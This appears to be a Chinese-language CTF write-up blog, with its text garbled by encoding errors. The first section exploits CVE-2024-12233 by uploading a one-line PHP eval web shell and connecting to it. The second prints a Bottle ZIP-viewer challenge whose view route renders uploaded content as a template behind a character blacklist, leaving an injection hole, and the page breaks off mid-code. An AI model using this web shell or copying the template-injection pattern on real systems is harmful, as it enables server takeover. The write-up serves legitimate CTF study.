    <content><![CDATA[<h1 id="1-b-by-n0t1ce-b0ard"><a href="#1-b-by-n0t1ce-b0ard" class="headerlink" title="1. \b@by n0t1ce b0ard"></a>1. \b@by n0t1ce b0ard</h1><p>æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯CVE-2024-12233ï¼Œä¸Šç½‘æŸ¥æ‰¾è¿›è¡Œå¤ç°</p>
<p>ä¾‹å¦‚Email: <code>111@test.com</code>ï¼ŒåŒæ—¶ä¸Šä¼ shell.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åèšå‰‘è¿æ¥http:&#x2F;&#x2F;[é¢˜ç›®IP]&#x2F;images&#x2F;<a href="mailto:&#49;&#49;&#49;&#64;&#x74;&#101;&#115;&#x74;&#46;&#99;&#111;&#x6d;">111@test.com</a>&#x2F;shell.php</p>
<hr>
<h1 id="2-éš¾è¿‡çš„bottle"><a href="#2-éš¾è¿‡çš„bottle" class="headerlink" title="2. éš¾è¿‡çš„bottle"></a>2. éš¾è¿‡çš„bottle</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„å…³é”®è¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å®‰å…¨è§£å‹ZIPæ–‡ä»¶ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³•æ–‡ä»¶è·¯å¾„: è·¯å¾„éå†æ”»å‡»æ£€æµ‹&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é¦–é¡µ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“¤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;è½»æ¾æŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;ä¸Šä¼ ZIPæ–‡ä»¶å¹¶å®‰å…¨åœ°æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œæ— éœ€è§£å‹åˆ°æœ¬åœ°è®¾å¤‡&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“ ä¸Šä¼ ZIPæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                â„¹ï¸ äº†è§£æ›´å¤š</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ›¡ï¸&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å®‰å…¨æ£€æµ‹&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æµ‹ä¸Šä¼ æ–‡ä»¶ï¼Œé˜²æ­¢è·¯å¾„éå†æ”»å‡»å’Œæ¶æ„å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“„&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å†…å®¹é¢„è§ˆ&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç›´æ¥åœ¨çº¿æŸ¥çœ‹ZIPæ–‡ä»¶ä¸­çš„æ–‡æœ¬å†…å®¹ï¼Œæ— éœ€ä¸‹è½½&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;âš¡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å¿«é€Ÿå¤„ç†&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;é«˜æ•ˆå¤„ç†å°äº1MBçš„ZIPæ–‡ä»¶ï¼Œå¿«é€Ÿè·å–å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸Šä¼ é¡µé¢&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ ZIPæ–‡ä»¶&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;ğŸ“¤ ä¸Šä¼ ZIPæ–‡ä»¶&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;é€‰æ‹©ZIPæ–‡ä»¶ï¼ˆæœ€å¤§1MBï¼‰&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;ä»…æ”¯æŒ.zipæ ¼å¼çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å¤§å°ä¸è¶…è¿‡1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“¤ ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        â†©ï¸ è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¤„ç†æ–‡ä»¶ä¸Šä¼ &quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;è¯·ä¸Šä¼ æœ‰æ•ˆçš„ZIPæ–‡ä»¶&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;æ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;å¤„ç†ZIPæ–‡ä»¶æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ æˆåŠŸ&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;âœ… ä¸Šä¼ æˆåŠŸ!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            âœ… æ–‡ä»¶å·²æˆåŠŸä¸Šä¼ å¹¶è§£å‹</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;ğŸ“„ &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    æŸ¥çœ‹</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ‘€ æŸ¥çœ‹ç¬¬ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        â• ä¸Šä¼ å¦ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ğŸ  è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶ä¸å­˜åœ¨&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯·æ±‚çš„è·¯å¾„ä¸æ˜¯æ–‡ä»¶&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;éæ³•è®¿é—®å°è¯•&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ— æ³•è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¯èƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶å†…å®¹åŒ…å«ä¸å…è®¸çš„å…³é”®è¯&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;æ¸²æŸ“é”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é™æ€æ–‡ä»¶æœåŠ¡&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span 